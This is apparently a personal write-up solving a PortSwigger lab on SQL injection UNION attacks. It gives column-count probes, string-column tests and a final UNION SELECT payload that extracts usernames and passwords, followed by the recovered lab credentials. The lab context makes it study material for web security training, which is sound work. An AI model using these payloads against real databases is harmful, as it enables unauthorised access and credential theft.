--Name: SQL injection UNION attack, retrieving data from other tables
--URL: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
--Level:Medium Time: 7 min
---------------------------------------------------------------------------------

-- Objective: Get user data and login as adminstrator

SELECT * FROM products WHERE category = 'Gifts'-- ???
SELECT * FROM products WHERE category = 'Gifts' ORDER BY 1-- ???     OK
SELECT * FROM products WHERE category = 'Gifts' ORDER BY 2-- ???     OK
SELECT * FROM products WHERE category = 'Gifts' ORDER BY 3-- ???     Error


SELECT ?, ? FROM products WHERE category = 'Gifts' UNION SELECT NULL, NULL-- ???    OK 
SELECT ?, ? FROM products WHERE category = 'Gifts' UNION SELECT 's', NULL-- ???     Error
SELECT ?, ? FROM products WHERE category = 'Gifts' UNION SELECT NULL, 's'-- ???     OK

SELECT ?, ? FROM products WHERE category = 'Gifts' UNION SELECT Username, Password FROM users-- ???   DB type = Oracle ++++  Solved
-- user: wiener
-- pass: uw1fdowzv7f0zoagryqq
-----------------------------
-- user: administrator
-- pass: y1whzs2mwkmpag3glauf
-----------------------------